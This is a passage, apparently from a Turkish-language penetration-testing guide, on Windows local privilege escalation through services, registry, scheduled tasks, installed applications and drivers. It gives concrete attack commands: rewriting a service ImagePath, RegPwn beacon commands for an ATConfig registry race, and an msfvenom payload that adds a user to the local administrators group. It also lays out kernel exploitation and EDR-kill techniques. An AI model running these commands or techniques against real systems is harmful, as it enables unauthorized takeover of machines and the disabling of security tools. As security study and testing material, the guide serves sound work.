```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Hizmet normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlayıp başlamadığını, yeniden başlatan bir failure action olup olmadığını veya hizmeti kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Hizmet kayıt defteri değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet kayıt defteri üzerindeki **izinlerinizi** şu şekilde **kontrol** edebilirsiniz:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Belirli bir hizmet anahtarında **Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** için yazma yetkisi sağlayan kayıt defteri izinleri olup olmadığını kontrol edin. Tek başına bir ACL girdisi, etkin erişimi kanıtlamaz: deny girdileri, geçerli token ve devralınan izinler önemlidir. Kayıt defteri anahtarı izinleri, hizmet nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` izinlerinden ayrıdır. Yetki yükseltme için ayrıca kullanılabilir bir hizmet yapılandırma alanı, hizmeti tetikleme yöntemi ve daha ayrıcalıklı bir hizmet kimliği gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sayfalarına bakın.

Yürütülen ikilinin Path değerini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Kayıt Defteri sembolik bağlantı yarışıyla rastgele HKLM değerine yazma (ATConfig)

Bazı Windows Erişilebilirlik özellikleri, daha sonra bir **SYSTEM** işlemi tarafından HKLM oturum anahtarına kopyalanan, kullanıcı başına **ATConfig** anahtarları oluşturur. Kayıt defterinde **sembolik bağlantı yarışı**, bu ayrıcalıklı yazma işlemini **herhangi bir HKLM yoluna** yönlendirerek rastgele HKLM **değeri yazma** olanağı sağlayabilir.<sup>[[18]](#references)</sup>

Anahtar konumları (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı denetimindeki yapılandırmayı saklar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz değeri **HKCU ATConfig**'e yerleştirin.
2. AT broker akışını başlatan güvenli masaüstü kopyalama işlemini tetikleyin (örn. **LockWorkstation**).
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** koyarak **yarışı kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefini gösteren bir **kayıt defteri bağlantısıyla** değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Rastgele HKLM değerine yazma olanağı elde ettikten sonra, hizmet yapılandırma değerlerinin üzerine yazarak LPE'ye geçin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir hizmet seçin (örn. **`msiserver`**) ve yazma işleminden sonra hizmeti tetikleyin. **Not:** Herkese açık exploit uygulaması, yarışın bir parçası olarak iş istasyonunu kilitler.

Örnek araçlar (RegPwn BOF / bağımsız):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz, **bu registry altında alt registry'ler oluşturabilirsiniz**. Windows services söz konusu olduğunda bu, **keyfi kod çalıştırmak için yeterlidir:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable dosyasının yolu tırnak içine alınmamışsa Windows, boşluktan önce biten her yolu çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şu dosyaları çalıştırmayı dener:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç tüm tırnak içine alınmamış hizmet yollarını listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu güvenlik açığını metasploit ile tespit edip exploit edebilirsiniz:** `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir service binary oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, kullanıcıların bir hizmet başarısız olduğunda gerçekleştirilecek eylemleri belirtmesine olanak tanır. Bu özellik bir binary'yi gösterecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla ayrıntı [resmî belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Zamanlanmış görev betiği hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görev için, `cmd.exe`'nin yanı sıra **eylem bağımsız değişkenlerinde** belirtilen betiği de kontrol edin. Aynı durum PowerShell `-File` gibi bir yorumlayıcının açık dosya bağımsız değişkeni için de geçerlidir. Zamanlanmış bir batch dosyası doğrudan bir PowerShell `-File` çağrısı içeriyorsa, başvurulan betiğin ACL'sini de inceleyin; değişkenler, koşullar ve kabuk zincirleme işlemleri elle izlenmelidir. Çağıranın yazabildiği bir betik veya üst dizin, yalnızca yapılandırılmış görev sorumlusu çağırandan farklıysa ve görev ilgili eyleme gerçekten ulaşıyorsa hesaplar arası yürütme için bir ipucudur. Betikler için yalnızca sona eklemeye izin veren bir ACL önemli olabilir; ancak önceki bir `exit` veya başka bir kontrol akışı, eklenen satırların erişilemez olmasına yol açabilir. Privilege escalation olduğunu ileri sürmeden önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi politikasını doğrulayın. Envanter çıkarma işlemi betiği değiştirmemeli veya görevi başlatmamalıdır.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosyanın, içeriği sıradan bir dizin listelemesinde görünmeyen adlandırılmış bir `:$DATA` akışı olabilir. Erişilebilir yedekleme veya yapılandırma dosyalarından oluşan küçük ve ilgili bir kümede, içeriği açmadan önce akış **adlarını ve boyutlarını** inceleyin; Windows bunları [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'in [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) komutuyla sunar. Bir sırrı çağrıştıran akış adı yalnızca bir ipucudur. Dosyanın etkin okuma erişimini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin hangi hesapla kimlik doğrulaması yaptığını kontrol edin. Rutin envanter çıkarma sırasında akışları yinelemeli olarak taramaktan ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı programı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizindeki `command.txt`, `reboot.rsf` ve proje `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` içerir. Yardımcı programı ayrıcalıklı bir hesapla başlatan zamanlanmış bir görev veya hizmet, bu girdilere düşük ayrıcalıklı yazma erişimini, yardımcı programın yürütülebilir dosyası korumalı olsa bile, söz konusu hesabın bağlamında komut yürütmeye dönüştürebilir. Ayrıcalıklı tüketiciyi ve **her iki** yan dosyanın oluşturulabildiğini veya değiştirilebildiğini doğrulayın; yalnızca yardımcı programı bulmak yeterli değildir.

Zamanlanmış bir görev için eylemindeki [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) değerini ve iki yan dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, yürütülebilir dosyanın bulunduğu dizin, görevin girdileri nereden okuduğunu doğrulamak için yalnızca bir ipucudur; kanıt değildir. Proje çalışma dosyası ön koşulu da karşılanmalıdır. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev sorumlusunu kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**Binary'lerin izinlerini** (belki birini üzerine yazıp privilege escalation sağlayabilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)) kontrol edin.

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), `C:\Windows\Temp` konumuna komut dosyaları yazan ve değiştirme başarısız olduğunda önceden var olan, yazma korumalı bir dosyayı çalıştıran eski Checkmk Windows agent sürümlerini etkiler. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Kurulu sürümün tam yama seviyesini ve etkilenen agent işleminin çalışıp çalışamayacağını kontrol edin; yalnızca `2.1` gibi bir dal etiketi etkilenip etkilenmediğini belirlemek için yeterli değildir. Envanter çıkarma işlemi, dosya oluşturmadan veya agent komutlarını tetiklemeden sürümü, hizmet durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML hizmeti incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), ADSelfService Plus build 6210 ve önceki sürümleri etkiledi; üretici sorunu build 6211'de düzeltti. Bu güvenlik açığı yalnızca SAML SSO **etkinse veya geçmişte etkinleştirilmişse** önem taşır. Bu nedenle kurulu ürün kaydı veya hizmet yolu bir bulgudur, ancak güvenlik açığının kanıtı değildir: tam build numarasını, SAML yapılandırma geçmişini, hizmetin ağdan erişilebilirliğini ve çalıştığı hesabı doğrulayın. Hizmet üzerinden kod çalıştırılması, o hesabın ayrıcalıklarını devralır; SYSTEM olarak çalıştırılması için örneğin SYSTEM hesabıyla çalışıyor olması gerekir. Ürünün Backup dizininde okunabilir bir `OfflineBackup_*.ezip` dosyası, ayrı bir şifreli yedek bulgusudur; kullanılabilir bir kimlik bilgisinin veya bu SAML güvenlik açığının kanıtı değildir. Rutin envanter çıkarma sırasında dosyayı açmadan yolunu ve erişim haklarını kaydedin.

#### Jenkins controller ve domain hesabı sınırları

Windows Jenkins controller üzerinde, job oluşturma veya yapılandırma iznini job'ı başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` hakları olarak belgeler](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzak tetikleyici başka bir build yolu sağlayabilir; ancak etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Çalıştırma, controller'ın veya seçilen agent'ın kimliğiyle yapılır; kayıtlı bir kimlik bilgisi yalnızca job'ın kapsamına erişebilmesi durumunda kullanılabilir. Ayrıca `JENKINS_HOME` metadata'sına erişimi inceleyin: Jenkins, kimlik bilgisi materyallerini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins gizli bilgilerinin depolanması](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların varlığı tek başına parola açığa çıkarmaz; **gerekli dosyalara okuma erişimini** ve hesabın yeniden kullanılması için ayrı bir yolu, gizli bilgileri paylaşılan çıktılara yazdırmadan doğrulayın. Bu hesabın AD kullanıcı nesnesinde `scriptPath` yazma hakkı varsa, bunu kullanıcılar arası çalıştırma olarak değerlendirmeden önce yazılabilir bir script yolunu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma veya zamanlanmış tüketiciyi doğrulayın. Ek grup kontrolü için etkin AD haklarının ayrıca doğrulanması gerekir.

#### Azure Pipelines self-hosted agent kimliği

Azure DevOps Server veya Azure Pipelines projesinde, pipeline **oluşturma veya düzenleme** iznini, pipeline'ı **kuyruğa alma** ve seçilen agent pool'u kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeler. Daha düşük ayrıcalıklı bir hesap script adımı gönderebiliyor ve bu pipeline'ı self-hosted Windows agent üzerinde çalıştırabiliyorsa, adım [agent için yapılandırılmış işletim sistemi hesabıyla](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) yürütülür. Kullanıcılar arası veya SYSTEM geçişi iddiasında bulunmadan önce ilgili pipeline'ı, branch/resource kısıtlamalarını, yetkilendirilmiş pool'u, çalıştırılabilir job'ı ve agent hizmetinin kimliğini doğrulayın. Kurulu bir agent, proje rolü veya repository yazma izni tek başına yalnızca bir bulgudur; pasif envanter çıkarma sırasında build başlatmadan izinleri ve yerel hizmet metadata'sını inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft,](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) eşitleme hizmetini çalıştıran ve SQL veritabanına erişen **ADSync hizmet hesabını**, dizin izinleri yapılandırılmış eşitleme özelliklerine bağlı olan **AD DS connector hesabından** ayırır. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır ve anahtar materyali [ADSync hizmet hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Kurulu bir sync hizmeti, yerel yönetici izlenimi veren bir grup veya veritabanı görünürlüğü tek başına çözülebilir bir kimlik bilgisini ya da domain ayrıcalığı yükseltmesini kanıtlamaz. Gerçek veritabanı okuma haklarını, hizmet hesabı/anahtar erişimini, kurulum ve SQL düzenini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin envanter çıkarma yalnızca hizmet ve erişim metadata'sını göstermeli, saklanan gizli bilgileri sorgulamamalı veya yazdırmamalıdır.

#### Printer driver destek DLL izinleri

Kurulu bir printer driver, destek DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir print process içinde yükleyebilir. Printer WMI envanterine erişim engellense bile üst dizinleri ve reparse point'leri dahil ederek ilgili driver dizininin ve DLL'lerin ACL'lerini inceleyin. [Ricoh printer driver sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [ilk açıklamada](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) DLL'lerin `PrintIsolationHost.exe` tarafından yüklenmesi anlatılır. Yazılabilir bir ACL yalnızca bir bulgudur: deny girdileri sonrasında etkin yazma erişimini, ilgili driver'ın kurulu olduğunu ve dosyayı ayrıcalıklı bir kimlikle yüklediğini, ayrıca üreticinin güncellenmiş driver'ının veya güvenlik programının kurulum sorununu giderip gidermediğini doğrulayın. Yalnızca dizin adına veya driver sürümüne bakarak güvenlik açığı olduğu sonucuna varmayın.

### Yazma İzinleri

Özel bir dosyayı okuyabilmek için herhangi bir yapılandırma dosyasını değiştirip değiştiremeyeceğinizi veya bir Administrator hesabı tarafından çalıştırılacak (schedtasks) bir binary dosyasını değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörlerindeki tüm plugin DLL'lerini otomatik yükler. Yazılabilir bir portable/kopya kurulum varsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik code execution sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından çalıştırılacak bir registry girdisinin veya binary'nin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Privilege escalation için ilgi çekici autoruns konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı** **okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Olası **üçüncü taraf, şüpheli/güvenlik açığı içeren** drivers arayın

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver keyfi kernel read/write primitive sunuyorsa (kötü tasarlanmış IOCTL handler'larında yaygındır), doğrudan kernel belleğinden bir SYSTEM token çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

İlgili Windows kernel-exploitation materyali:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Savunmasız çağrının saldırganın kontrolündeki bir Object Manager yolunu açtığı race-condition hatalarında, aramayı bilerek yavaşlatmak (max-length bileşenler veya derin dizin zincirleri kullanarak) zaman aralığını mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool disclosure'ları ve I/O ring pivot'ları

Bazı Windows kernel LPE zincirleri, her biri tek başına zayıf olan iki bug'dan oluşturulabilir: kuyruk kilidi hâlâ tutulurken bir request/CBD'yi serbest bırakan **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'ından veri sızdıran **copy öncesi kilit bırakma** disclosure'ı.<sup>[[29]](#references)</sup>

Denetim ve exploitation notları:

- **Kilit altında serbest bırakma + ardından cancel**: Başarı yolunun **Acquire -> CompleteRequest/free -> Release**, cancel yolunun ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir yol arayın. Başarı yolu, CBDQ/CSQ kilidini bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`'a ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bekleyen bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA`'yı sürücünün remove callback'ine geçirebilir.
- Serbest bırakılan queue object'i aynı boyutta, saldırganın kontrolündeki bir paged-pool allocation'ıyla **yeniden kullanın**. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve boyut kontrol edilebilir, ayrıca daha sonra pipe read/peek işlemleriyle incelenebilir. Serbest bırakılan object list link'leri içeriyorsa, bunların üzerine **user memory'de sahte request node'larından oluşan döngüsel bir liste** yazarak sürücünün özgün liste başında durmak yerine saldırganın tanımladığı request structure'larını tekrar tekrar işlemesini sağlayın.
- **Öngörülebilir bir write'ı geliştirin**: Sahte request, bookkeeping write'larında (timestamps / QPC / refcount bitişiğindeki alanlar) kullanılan iç içe bir context pointer'ını yönlendiriyorsa, **adresi kontrol edilebilen ancak değeri kontrol edilemeyen** bir kernel write elde edebilirsiniz. Bu durumda son bir code/data pointer'ı yerine sprayed pool object'in **length/size** alanını hedefleyin; ardından bozulmuş object'in **out-of-bounds paged-pool read** sağlamasına kadar spray'i tarayın.
- **Race ile tetiklenebilen disclosure örüntüsü**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan her syscall güçlü bir adaydır. Saldırgan kopyalanan buffer'ı büyütebiliyorsa (örneğin serializer'ın son allocation boyutunu artıran çok sayıda list/resource entry ekleyerek), güvenilirlik artar; çünkü daha uzun kopyalama, sistemi çökertmeden değiştirme aralığını genişletir.
- **Pointer bakımından zengin refill hedefleri**: Windows **I/O ring** registered-buffer array'leri mükemmel disclosure hedefleridir; çünkü paged-pool boyutları saldırgan tarafından kontrol edilir (`8 * regBufferCnt`) ve her eleman bir `_IOP_MC_BUFFER_ENTRY`'ye işaret eden kernel pointer'ıdır. Bu array'lerden birini leak edin, çevresindeki `IORING_OBJECT`'i bulun, ardından sonraki I/O ring işlemlerinin saldırganın oluşturduğu entry'leri kullanıp keyfi kernel read/write sağlaması için **`RegBuffers`** ve **`RegBuffersCount`** değerlerini bozun. Kullanılabilir tek write kararlı bir byte sağlıyorsa (örneğin `KUSER_SHARED_DATA+0x14`'ten), `0x0101010101010101` gibi yinelenen byte'lardan oluşan bir user pointer oluşturmak için **örtüşen hizasız write'lar** kullanın, bunu `VirtualAlloc` ile map edin ve sahte registered-buffer array'ini oraya yerleştirin.<sup>[[30]](#references)</sup>

Yararlı debugging göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Once corrupted I/O ring üzerinden arbitrary kernel read/write elde ettikten sonra, standart post-primitive workflow'u kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive bellek bozulması primitives

Modern hive zafiyetleri, deterministik layout'lar hazırlamanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve özel bir driver olmadan metadata bozulmasını kernel paged-pool taşmalarına dönüştürmenize olanak tanır. Tüm zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırgan kontrolündeki yollardan kaynaklanan `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver'lar userland'den bir registry path kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `RTL_QUERY_REGISTRY_DIRECT` ile `int readValue` gibi bir stack scalar'a yapar. `RTL_QUERY_REGISTRY_TYPECHECK` belirtilmemişse, `EntryContext` geliştiricinin beklediği türe göre değil, registry değerinin **gerçek** türüne göre yorumlanır.

Bu, kullanışlı iki primitive sağlar:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcının kontrolündeki mutlak bir `\Registry\...` path'i, driver'ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/loglar üzerinden anahtarların varlığını sızdırmasına ve bazen çağıranın doğrudan erişemeyeceği değerleri okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar hedef, registry değerinin türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlu bir binary buffer olarak type confusion'a uğrar.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanarak **untrusted hive**'a erişirse, kernel çağrıları `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile çöker. Exploit edilebilirliği korumak için değerleri `HKCU` altına yerleştirmek yerine **trusted system hive'ları içindeki saldırgan tarafından yazılabilir anahtarları** arayın.
- **Trusted-hive staging**: Yazılabilir `\Registry\Machine` alt anahtarlarını listelemek için NtObjectManager kullanın ve sandbox'lı bağlamlardan erişilebilen anahtarları bulmak için taramayı kopyalanmış bir **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` içine yapılan 8 baytlık doğrudan yazma, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`'in bir `UNICODE_STRING`'i göstermesini bekler. Kod önce saldırgan kontrollü bir `REG_DWORD`'u stack'teki bir skaler değişkene yükler ve ardından aynı buffer'ı string okuması için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkileyerek kısmen kontrollü bir kernel write elde eder.
- **`REG_BINARY`**: Büyük binary veriler için direct mode, `EntryContext`'teki ilk `LONG` değerini işaretli bir buffer boyutu olarak ele alır. Önceki bir `REG_DWORD` okuması yeniden kullanılan skaler değişkende saldırgan kontrollü **negatif** bir değer bırakırsa sonraki `REG_BINARY` sorgusu saldırgan baytlarını bitişik stack slot'larının üzerine doğrudan kopyalar. Bu, çoğu zaman callback-pointer'ın tamamının üzerine yazmak için en temiz yoldur.

Güçlü bir hunting pattern: **aynı stack variable'a yeniden başlatmadan farklı türlerde registry read yapılması**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry read'in ikinci read'in yapılıp yapılmayacağını belirlediği code path'ler için grep yapın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN eksikliğini kötüye kullanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar, IoCreateDeviceSecure aracılığıyla güçlü bir SDDL ile device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN bayrağını ayarlamayı unutur. Bu bayrak olmadan, device fazladan bir bileşen içeren bir path üzerinden açıldığında güvenli DACL uygulanmaz ve ayrıcalıksız herhangi bir kullanıcı aşağıdaki gibi bir namespace path kullanarak handle elde edebilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir örnek)

Kullanıcı device'ı açabildiğinde, driver'ın sunduğu ayrıcalıklı IOCTL'lar LPE ve tampering için kötüye kullanılabilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- Rastgele process'lere tam erişimli handle döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser aracılığıyla SYSTEM shell).
- Kısıtlamasız raw disk read/write (offline tampering, boot-time persistence hileleri).
- Protected Process/Light (PP/PPL) dahil rastgele process'leri sonlandırma; böylece kernel aracılığıyla user land'den AV/EDR kill mümkün olur.

